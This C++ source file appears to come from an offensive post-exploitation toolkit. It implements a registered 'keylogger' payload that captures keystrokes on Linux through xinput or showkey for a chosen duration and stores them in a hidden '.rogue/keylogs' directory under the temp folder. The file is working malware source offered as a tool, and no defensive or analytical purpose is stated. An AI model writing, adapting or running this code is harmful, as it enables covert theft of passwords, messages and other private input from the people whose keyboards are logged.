#include <sys/stat.h>
#include <unistd.h>

#include <cctype>
#include <cstdlib>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;

constexpr size_t kMaxEntries = 100;

int parse_int_or(const std::string& s, int fallback) {
    size_t i = 0;
    while (i < s.size() && std::isspace((unsigned char)s[i])) i++;
    size_t start = i;
    if (i < s.size() && (s[i] == '+' || s[i] == '-')) i++;
    size_t digits = i;
    while (i < s.size() && std::isdigit((unsigned char)s[i])) i++;
    if (i == digits) return fallback;
    return std::atoi(s.substr(start, i - start).c_str());
}

std::vector<std::string> go_split_lines(const std::string& s) {
    if (s.empty()) return {""};
    return split(s, '\n');
}

std::string lower_ascii(const std::string& s) {
    std::string out = s;
    for (char& c : out) c = (char)std::tolower((unsigned char)c);
    return out;
}

std::string local_stamp() {
    std::time_t t = std::time(nullptr);
    std::tm tmv{};
    localtime_r(&t, &tmv);
    char buf[32];
    std::strftime(buf, sizeof(buf), "%Y%m%d_%H%M%S", &tmv);
    return buf;
}

std::string temp_dir() {
    const char* keys[] = {"TMPDIR", "TEMP", "TMP"};
    for (const char* k : keys) {
        const char* v = getenv(k);
        if (v != nullptr && *v != '\0') return v;
    }
    return "/tmp";
}

class Keylogger : public Payload {
  public:
    const char* name() const override { return "keylogger"; }
    const char* category() const override { return "collection"; }
    const char* description() const override {
        return "Log keystrokes using platform-specific APIs (Linux /dev/input or xinput/test)";
    }

    Output execute(const Args& args) const override {
        std::string duration = "30";
        auto it = args.find("duration");
        if (it != args.end() && !it->second.empty()) duration = it->second;
        int sec = parse_int_or(duration, 30);

        std::string method = "xinput/test";
        std::vector<std::string> entries;

        std::string xinput = which_exe("xinput");
        if (!xinput.empty()) {
            CmdResult list = run_cmd_out({xinput, "list", "--name-only"});
            if (list.ok) {
                std::string kb_device;
                for (const auto& raw : go_split_lines(list.out)) {
                    std::string line = trim(raw);
                    std::string low = lower_ascii(line);
                    if (low.find("keyboard") != std::string::npos ||
                        low.find("at translated set") != std::string::npos) {
                        kb_device = line;
                        break;
                    }
                }

                if (!kb_device.empty()) {
                    method = "xinput/" + kb_device;
                    CmdResult out = run_cmd_ctx({xinput, "test", "-key", kb_device}, sec);
                    if (!out.out.empty()) {
                        for (const auto& l : go_split_lines(out.out)) {
                            if (!trim(l).empty()) {
                                entries.push_back(l);
                                if (entries.size() >= kMaxEntries) break;
                            }
                        }
                    } else {

                        CmdResult out2 = run_cmd_ctx({xinput, "test-xi2", "--root"}, sec);
                        for (const auto& l : go_split_lines(out2.out)) {
                            if (l.find("KeyPress") != std::string::npos ||
                                l.find("RawKeyPress") != std::string::npos) {
                                entries.push_back(l);
                                if (entries.size() >= kMaxEntries) break;
                            }
                        }
                    }
                }
            }
        }

        if (entries.empty()) {
            std::string showkey = which_exe("showkey");
            if (!showkey.empty()) {
                CmdResult out = run_cmd_ctx({showkey, "-s"}, sec);
                if (!out.out.empty()) {
                    method = "showkey";
                    for (const auto& l : go_split_lines(out.out)) {
                        if (!trim(l).empty()) {
                            entries.push_back(l);
                            if (entries.size() >= kMaxEntries) break;
                        }
                    }
                }
            }
        }

        OJ r = OJ::object();
        r["timestamp"] = now_rfc3339();
        r["method"] = method;
        r["captured_keys"] = (int)entries.size();
        if (entries.empty()) {
            r["entries"] = nullptr;
        } else {
            OJ arr = OJ::array();
            for (const auto& e : entries) arr.push_back(e);
            r["entries"] = arr;
        }

        std::string base_dir = temp_dir() + "/.rogue";
        std::string cache_dir = base_dir + "/keylogs";
        ::mkdir(base_dir.c_str(), 0700);
        ::mkdir(cache_dir.c_str(), 0700);
        std::string out_file = cache_dir + "/keylog_" + local_stamp() + ".log";
        std::string output_dir;
        if (!entries.empty()) {
            std::string joined;
            for (size_t i = 0; i < entries.size(); ++i) {
                if (i > 0) joined += "\n";
                joined += entries[i];
            }
            FILE* f = std::fopen(out_file.c_str(), "wb");
            if (f != nullptr) {
                std::fwrite(joined.data(), 1, joined.size(), f);
                std::fclose(f);
                ::chmod(out_file.c_str(), 0600);
                output_dir = out_file;
            }
        }
        r["output_dir"] = output_dir;

        std::string s = MarshalJSON(r);
        return Output(s.begin(), s.end());
    }
};

Keylogger g_keylogger;

struct Reg { Reg() { Register(&g_keylogger); } };
Reg g_reg;

}
}
